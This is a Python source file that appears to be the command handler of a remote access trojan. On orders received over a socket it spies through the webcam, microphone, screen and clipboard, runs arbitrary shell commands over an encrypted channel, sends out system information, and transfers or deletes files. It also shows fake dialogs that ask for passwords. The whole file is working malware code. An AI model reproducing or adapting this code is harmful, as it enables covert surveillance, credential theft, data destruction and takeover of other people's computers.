from os import listdir, chdir, path, remove, getcwd
import socket
from select import select
from json import dumps, loads
from numpy import array, uint8
import pyaudio
from time import sleep
from shutil import rmtree
from cryptography.fernet import Fernet
from subprocess import check_output, STDOUT
from PIL import Image
from platform import machine, version, platform, processor
from platform import system as sys_info
from psutil import disk_usage, virtual_memory
from clipboard import paste, copy


def popup(conn: socket.socket, command: str) -> None:
    from pymsgbox import alert, confirm, prompt, password
    parts = command.strip().split("|")
    if len(parts) < 2:
        return

    cmd_type = parts[0][2:8]
    if cmd_type == "alert":
        alert(parts[2], parts[1])
    elif cmd_type == "confr":
        buttons = parts[3].split(",") if len(parts) > 3 else []
        result = confirm(text=parts[2], title=parts[1], buttons=buttons)
        conn.send(result.encode())
    elif cmd_type == "qstion":
        result = prompt(text=parts[2], title=parts[1])
        conn.send(result.encode())
    elif cmd_type == "passwd":
        result = password(text=parts[2], title=parts[1], mask="*")
        conn.send(result.encode())


def hd_alert(conn: socket.socket) -> None:
    import cv2
    data = ""
    try:
        while True:
            rc_data = conn.recv(40000).decode()
            if "END" in rc_data[-3:]:
                data += rc_data[:-3]
                break
            data += rc_data
        cv_img = array(loads(data)).astype(uint8)
        img = Image.fromarray(cv_img)
        for _ in range(10000):
            img.show()
    except Exception:
        return


def clipboard(command: str, conn: socket.socket) -> None:
    if command == "GCLPB":
        try:
            conn.sendall((paste() + "ENDeyeRT").encode())
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
            return
    elif command == "WCLPB":
        data = ""
        try:
            while True:
                data2 = conn.recv(10000).decode()
                if "ENDeyeRT" in data2:
                    data += data2.replace("ENDeyeRT", "")
                    break
                data += data2
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
            return
        copy(data)


def send_info(conn: socket.socket) -> None:
    if "windows" in sys_info():
        root_path = r"C:\\"
    else:
        root_path = "/"
    conn.sendall(
        f"{disk_usage(root_path)}|{virtual_memory()}|{machine()}|{version()}|{platform()}|{processor()}".encode()
    )


def _decrypt_fs(data: bytes | str, key: bytes) -> bytes:
    if not isinstance(data, bytes):
        data = str(data).encode()
    if data:
        fernet = Fernet(key)
        return fernet.decrypt(data)
    raise AttributeError


def _encrypt_fs(data: bytes | str, key: bytes) -> bytes:
    if not isinstance(data, bytes):
        data = str(data).encode()
    if data:
        fernet = Fernet(key)
        return fernet.encrypt(data)
    raise AttributeError


def shell_rn(conn: socket.socket, key: bytes) -> None:
    conn.settimeout(600)
    while True:
        try:
            command = _decrypt_fs(conn.recv(1024), key).decode().strip()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
            break
        except Exception:
            break
        if command == "GTINFO":
            conn.sendall(_encrypt_fs(f"{socket.gethostname()}[{getcwd()}]", key))
        elif "END" in command:
            break
        elif command.startswith("cd"):
            parts = command.split(" ", 1)
            if len(parts) == 1:
                conn.sendall(_encrypt_fs("So where?", key))
            else:
                try:
                    chdir(parts[1].strip())
                    conn.sendall(_encrypt_fs("None", key))
                except Exception:
                    conn.sendall(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
        else:
            if "bash" in command:
                conn.sendall(_encrypt_fs("What do you want from me ?!", key))
            else:
                try:
                    out = check_output(command, stderr=STDOUT, shell=True)
                except Exception as e:
                    out = e
                try:
                    conn.sendall(_encrypt_fs(out, key))
                except Exception:
                    conn.sendall(_encrypt_fs("None", key))


def take_scr(conn: socket.socket) -> None:
    from pyautogui import screenshot
    from PIL import Image as PILImage
    try:
        scr = screenshot()
        scr.thumbnail((1024, 1024))
        arr = array(scr)
        rgb_list = arr.tolist()
        dmps = dumps(rgb_list)
        conn.sendall(dmps.encode())
    except MemoryError:
        return
    except Exception:
        return


def get_pic(conn: socket.socket) -> None:
    import cv2
    try:
        vid = cv2.VideoCapture(0)
        ret, frame = vid.read()
        vid.release()
        if ret:
            frame = cv2.resize(frame, (640, 480))
            rgb_list = frame.tolist()
            dmps = dumps(rgb_list)
            conn.sendall(dmps.encode())
    except MemoryError:
        return
    except Exception:
        return


def live(conn: socket.socket) -> None:
    import cv2
    vid = cv2.VideoCapture(0)
    while True:
        ret, frame = vid.read()
        if not ret:
            break
        try:
            frame = cv2.resize(frame, (640, 480))
            rgb_list = frame.tolist()
            dmps = dumps(rgb_list)
            conn.sendall(dmps.encode())
        except MemoryError:
            break
        except Exception:
            break
        conn.send(b"END")
        try:
            flag = conn.recv(1024).decode()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
            break
        if flag == "end":
            break
        sleep(0.25)
    vid.release()


def rec_sound(conn: socket.socket) -> None:
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    try:
        seconds = int(conn.recv(1024).decode())
    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
        return
    except Exception:
        return
    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
    frames = []
    for _ in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    conn.sendall(str(p.get_sample_size(sample_format)).encode())
    sleep(0.25)
    for itm in frames:
        conn.sendall(itm)


def dir_exp(conn: socket.socket, command: str) -> None:
    if command.startswith("FXshf:"):
        fds = ""
        srh_file = command.split(":", 1)[1]
        for fd in listdir():
            if srh_file in fd:
                if path.isdir(fd):
                    fds += "D:"
                else:
                    fds += "F:"
                fds += fd + "\n"
        sleep(0.5)
        try:
            conn.sendall(fds.encode())
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
            return
    elif command.startswith("FXchd:"):
        new_path = command.split(":", 1)[1]
        if ".." in new_path:
            sleep(0.5)
            conn.send(b"The path entered is incorrect !")
            return
        try:
            chdir(new_path)
            sleep(0.5)
            conn.send(b" Done !")
        except FileNotFoundError:
            sleep(0.5)
            conn.send(b"The path entered is incorrect !")
    elif command.startswith("FXdwn:") or command.startswith("4FXdwn:"):
        file_path = command.split(":", 1)[1]
        if ".." in file_path:
            conn.sendall(b"The path entered is incorrect !")
            return
        buffer = 4096
        try:
            if path.isfile(file_path):
                file_size = path.getsize(file_path)
                if command.startswith("FXdwn:"):
                    conn.sendall(str(file_size).encode())
                with open(file_path, "rb") as b_file:
                    while True:
                        rdata = b_file.read(buffer)
                        if not rdata:
                            break
                        conn.sendall(rdata)
                if command.startswith("4FXdwn:"):
                    with open(file_path, "wb") as f:
                        while True:
                            try:
                                data = conn.recv(buffer)
                            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
                                break
                            if "END" in str(data[-3:]):
                                f.write(data[:-3])
                                break
                            if not data:
                                break
                            f.write(data)
            else:
                return
        except FileNotFoundError:
            conn.sendall(b"The path entered is incorrect !")
            return
    elif command.startswith("FXrmf:"):
        file_path = command.split(":", 1)[1]
        if ".." in file_path:
            conn.sendall(b"The path entered is incorrect !")
            return
        if path.isfile(file_path):
            remove(file_path)
            conn.sendall(b"Done !")
        elif path.isdir(file_path):
            rmtree(file_path)
            conn.sendall(b"Done !")
        else:
            conn.sendall(b"Failed! can't find file path !")
    elif command.startswith("FXupd:"):
        buffer = 4096
        file_path = command.split(":", 1)[1]
        if ".." in file_path:
            return
        try:
            with open(file_path, "wb") as f:
                while True:
                    try:
                        data = conn.recv(buffer)
                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
                        return
                    if "END" in str(data[-3:]):
                        f.write(data[:-3])
                        break
                    f.write(data)
        except IsADirectoryError:
            return


def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
    try:
        if command == "Tpict":
            get_pic(conn)
        elif command == "Rsound":
            rec_sound(conn)
        elif command == "Glive":
            live(conn)
        elif command == "Tscr":
            take_scr(conn)
        elif command.startswith("FX") or command.startswith("4FX"):
            dir_exp(conn, command)
        elif command == "RMCM":
            shell_rn(conn, key)
        elif command.startswith("WN"):
            popup(conn, command)
        elif command == "HDalert":
            hd_alert(conn)
        elif command in ("GCLPB", "WCLPB"):
            clipboard(command, conn)
        elif command == "Sinfo":
            send_info(conn)
    except Exception:
        pass
    try:
        conn.send(b"END")
    except Exception:
        pass